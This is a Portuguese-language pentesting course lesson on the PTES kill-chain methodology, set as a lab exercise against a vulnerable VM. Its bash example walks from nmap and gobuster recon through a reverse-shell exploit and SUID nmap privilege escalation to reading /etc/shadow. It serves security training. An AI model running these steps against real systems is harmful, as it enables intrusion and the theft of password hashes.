# Módulo 9: Projeto Final Senior
## Aula 01 - Metodologia de Auditoria Pentest Completo (Cyber Kill-Chain)

### 1. ANALOGIA DO DIA A DIA
Um ataque profissional Sênior não é um doido correndo com uma AK-47 aos gritos
num shopping, testando todas as portas pra ver quem roubar (Isso é ScriptKiddies e Bots).
A auditoria real Sênior é o Mestre Assaltante de "La Casa de Papel":
Ele estuda as rotas da CIA na base de fora antes (Enumeração OSINT), mapeia horários  das guardas (Recon/Services), 
descobre que o duto de Câmera 4 tem uma mancha as 3am (Vulnerability Discovery), 
infiltra o espião no teto fingindo ser guarda (Exploitation Auth Bypass), 
destranca lentamente as travas do gerador (Privilege Escalation root), e 
leva sacolas pro cofre sem tocar o alrme enquanto os policiais lá em cima n sabem 
do teto de ferro (Exfiltração Furtiva E Persistência Backdoor). Hackear é metódico. E o framework do metódico se chama PTES.

### 2. O QUE É (definição técnica Senior)
A Metodologia de Auditoria ou O Processo Executivo de Pentesting do modelo de padrão do mercado usa O **PTES (Penetration Testing Execution Standard)** ou **Mitre ATT&CK**. Esse passo a passo blinda legalmente o consultor e guia os processos pra não atirar as cegas.
Fazes de um Engajamento Root-to-Boot VM:
1. **Intelligence Gathering** (Scans passivos ping sweep, Gobuster nmap aula01)
2. **Vulnerability Analysis** (SearchSploit, Scripts LUA Nmap, OpenVAS p cruzar Banners das falhas achadas).
3. **Exploitation** (Montar payloads Metasploit/Bash shell reversos q atravessam portas nas vuln provadas e ganha "User Access WWW-Data").
4. **Post Exploitation / PrivEsc** (Local Enum Linpeas pra achar SUIDs e Capabilities Módulo 5, ganhando root # e exfiltracao do db).
5. **Reporting** (Escrever Pro Business e Technical a cadeia de vetores pro Blue T fix).

### 3. EXERCÍCIO DE PROJETO (VM VULNERÁVEL OBRIGATÓRIA)
Seu Dever na Prática Integrada Sênior para as próximas aulas deste módulo final:
1. Baixe o **Metasploitable 2** ou Suba uma BOX fácil no *HackTheBox*.
2. Isole na REDE Host-Only. 
3. O IP é `192.168.0.35` (Exemplo). **Seu objetivo final: Obter arquvio `/etc/shadow`!**
4. Você usará e rodará cada comando dos arquivos `/Módulo_XX_*.sh` em ordem cronológica contra esse IP de VM. 

**Exemplo Master de Flow Executado do Nosso Curso p Projeto:**
```bash
# Fase 1: Eu Sênior mapeando (Aulas de Nmap + Gobuster)
nmap -sS -p- 192.168.0.35 -oN nmap_fast.txt
gobuster dir -u http://192.168.0.35 -w list_comum.txt

# Fase 2: Achamos pasta '/admin' com painel CMS XPTO Version 1.2
searchsploit CMS XPTO 1.2

# Fase 3: Rodo exploit python remote mandando shell pra nossa porta local!
python3 exploit_CMS_xpto.py -t 192.168.0.35 -lh 192.168.0.100 -lp 9001
# -> Cai na sh do /var/www  (I AM IN!)

# Fase 4: Boto Linpeas rodar La dentro ou vejo SUID Manualmente.
find / -perm -u=s -type f 2>/dev/null  
# Acha o nmap com SUID Root na caixa! Ganhamos a box pelo truque 'nmap --interactive -> !sh'. EU SOU DEUS Root!

# Fase 5: Capture the Flag shadow data ! Missao Cumprida e ir pro word anotar.
cat /etc/shadow > win.txt
```

### 4. VERIFICAÇÃO E TROUBLESHOOTING
Não tem segredo de CTF e de consultoria se a KillChain/Metodologia estiver cravada na Parede!
Quando o júnior "Trava" 3 dias sem avançar? É porque ele Achou SQL INJ e tentou pular pra Fase 4 PrivEsc antes DE TER ACHADO E CONSEGUIDO UMA SHELL DE RCE e a Execução Estável do user (Apressar etapa). Volte pra base, refine tools de estabilizar shell (python tty spawn) e dps pule.

### 5. CONCEITO SENIOR E O "MITRE ATT&CK"
Mercado Master usa Táticas Padrões ID pro SOC. Quando vc relata falha de "Path Hijacking" pro teu time azul de empresa, vc n fala: "Oh eu envenenei export lá", Você descrever no report formal: Deflagrado o uso da técnica **T1574.007 (Hijack Execution Flow: PATH Interception)**. É o banco de catalogos global padrao pra RedTeam falar mesm língua que EDRs da Crowdstrike Blue Team. Adote nos relatórios do projeto!
